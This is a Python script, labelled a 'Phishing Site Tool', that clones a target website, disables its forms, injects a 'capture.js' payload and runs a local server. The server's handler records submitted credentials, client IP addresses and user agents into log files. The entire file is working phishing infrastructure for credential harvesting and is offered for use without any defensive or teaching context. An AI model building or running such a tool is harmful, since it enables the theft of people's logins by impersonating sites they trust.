import datetime
import os
import sys
import json
import hashlib
import argparse
import requests
from http.server import HTTPServer, SimpleHTTPRequestHandler, BaseHTTPRequestHandler
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

# Settings
TMP_DIR = "tmp"
JS_PAYLOAD_FILE = "capture.js"
PORT = 8080

def sanitize_path(path):
    """Converts URL paths into safe filesystem paths."""
    return os.path.normpath(path.replace(":", "").replace("?", "").replace("#", ""))

def download_resource(url, local_path):
    """Downloads a resource if it does not already exist."""
    if os.path.exists(local_path):
        print(f"File already exists, skipping: {local_path}")
        return  # Skip download if file exists

    try:
        response = requests.get(url, stream=True)
        if response.status_code == 200:
            os.makedirs(os.path.dirname(local_path), exist_ok=True)
            with open(local_path, "wb") as f:
                for chunk in response.iter_content(1024):
                    f.write(chunk)
            print(f"Downloaded: {url} -> {local_path}")
        else:
            print(f"Failed to download: {url} (HTTP {response.status_code})")
    except Exception as e:
        print(f"Error downloading: {url} ({e})")

def get_local_path(url, base_url, tmp_dir, absolute_dir):
    """Determines the local path for storing a resource."""
    parsed_url = urlparse(url)
    if parsed_url.netloc == urlparse(base_url).netloc:
        # Relative or same domain
        return os.path.join(tmp_dir, sanitize_path(parsed_url.path.lstrip("/")))
    else:
        # External absolute resource
        external_dir = os.path.join(absolute_dir, parsed_url.netloc)
        return os.path.join(external_dir, sanitize_path(parsed_url.path.lstrip("/")))

def download_site(site_url, local_dir):
    """Downloads the entire website and adjusts links."""
    absolute_dir = os.path.join(local_dir, "_")
    os.makedirs(local_dir, exist_ok=True)

    response = requests.get(site_url)
    if response.status_code != 200:
        print(f"Failed to download the main site: {response.status_code}")
        sys.exit(1)

    soup = BeautifulSoup(response.text, "html.parser")
    base_url = "{uri.scheme}://{uri.netloc}".format(uri=urlparse(site_url))

    # Process and download all resources
    for tag, attr, folder in [("link", "href", "css"),  # CSS
                              ("script", "src", "js"),  # JavaScript
                              ("img", "src", "images"),  # Images
                              ("source", "src", "media"),  # Videos/audio
                              ("video", "src", "media"),
                              ("audio", "src", "media"),
                              ("iframe", "src", "iframes")]:  # Iframes
        for resource in soup.find_all(tag):
            url = resource.get(attr)
            if url:
                abs_url = urljoin(base_url, url)
                local_path = get_local_path(abs_url, base_url, local_dir, absolute_dir)
                download_resource(abs_url, local_path)
                resource[attr] = os.path.relpath(local_path, local_dir)

    # Modify forms to redirect to the capture endpoint
    for form in soup.find_all("form"):
        form["action"] = "#"
        form["onsubmit"] = "return false;"
        
    # Create JS payload
    create_js_payload(local_dir)
        
    # Include JS payload
    script_tag = soup.new_tag("script", src="capture.js")
    soup.body.append(script_tag)

    # Save the modified HTML
    html_path = os.path.join(local_dir, "index.html")
    with open(html_path, "w", encoding="utf-8") as f:
        f.write(str(soup))
    print(f"Main page downloaded: {html_path}")

    return local_dir

def create_js_payload(local_dir):
    js_dest_path = os.path.join(local_dir, "capture.js")
    os.makedirs(os.path.dirname(js_dest_path), exist_ok=True)
    with open(JS_PAYLOAD_FILE, "r", encoding="utf-8") as js_src:
        with open(js_dest_path, "w", encoding="utf-8") as js_dest:
            js_dest.write(js_src.read())
    print(f"Payload script copied: {js_dest_path}")

def start_server(local_dir, results_dir, remote_url, port):
    """Starts a local HTTP server."""
    os.chdir(local_dir)

    class PhishingHandler(SimpleHTTPRequestHandler):
        def do_POST(self):
            """Handles POST requests to capture credentials."""
            if self.path == "/capture":
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')
                post_data_json = json.loads(post_data)
                log_entry = {
                    "local_url": self.headers.get('Referer', ''),
                    "remote_url": remote_url,
                    "address": self.client_address[0],
                    "userAgent": self.headers.get('User-Agent', ''),
                    "data": post_data_json,
                }
                print(f"Captured data from {log_entry['address']}: {post_data_json}")
                
                # Log id with current date and time
                log_id = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
                log_attempt = 1
                log_file_path = os.path.join(results_dir, log_id + ".json")
                
                while os.path.exists(log_file_path):
                    log_attempt += 1
                    log_id = datetime.datetime.now().strftime("%Y%m%d%H%M%S-") + str(log_attempt)
                    log_file_path = os.path.join(results_dir, log_id + ".json")
                
                with open(log_file_path, "w", encoding="utf-8") as log_file:
                    json.dump(log_entry, log_file, indent=4)
                    
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"Captured")
            else:
                super().do_POST()

    httpd = HTTPServer(("", port), PhishingHandler)
    print(f"Server running at http://localhost:{port}")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down server...")
        httpd.server_close()

def clean_tmp(tmp_dir):
    """Deletes the temporary directory."""
    if os.path.exists(tmp_dir):
        for root, dirs, files in os.walk(tmp_dir, topdown=False):
            for name in files:
                os.remove(os.path.join(root, name))
            for name in dirs:
                os.rmdir(os.path.join(root, name))
        os.rmdir(tmp_dir)
        print("Temporary directory cleaned.")
    else:
        print("Temporary directory does not exist.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Phishing Site Tool")
    subparsers = parser.add_subparsers(dest="command")

    # Start command
    start_parser = subparsers.add_parser("start", help="Start phishing site")
    start_parser.add_argument("url", type=str, help="URL of the target site")

    # Clean command
    clean_parser = subparsers.add_parser("clean", help="Clean temporary directory")

    args = parser.parse_args()

    if args.command == "start":
        md5_hash = hashlib.md5(args.url.encode()).hexdigest()
        
        current = os.path.abspath(os.path.dirname(__file__))
        workspace_dir = os.path.join(current, TMP_DIR, md5_hash)
        site_dir = os.path.join(workspace_dir, "public")
        results_dir = os.path.join(workspace_dir, "logs")
    
        download_site(args.url, site_dir)
        os.makedirs(results_dir, exist_ok=True)
        start_server(site_dir, results_dir, args.url, PORT)
    elif args.command == "clean":
        clean_tmp(TMP_DIR)
    else:
        parser.print_help()
